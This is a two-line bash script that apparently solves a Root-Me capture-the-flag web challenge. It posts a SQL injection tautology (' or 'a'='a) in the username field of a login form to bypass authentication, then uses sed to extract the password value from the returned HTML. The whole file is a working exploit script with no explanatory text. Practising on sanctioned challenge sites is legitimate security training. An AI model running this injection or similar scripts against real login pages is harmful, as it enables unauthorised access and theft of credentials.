#!/bin/bash

curl http://challenge01.root-me.org/web-serveur/ch23/?action=login -d "username=John' or 'a'='a&password=whatever" -s | sed s/".*input type=\"password\" value=\"\([^\"]\+\)\".*"/"\1\n"/
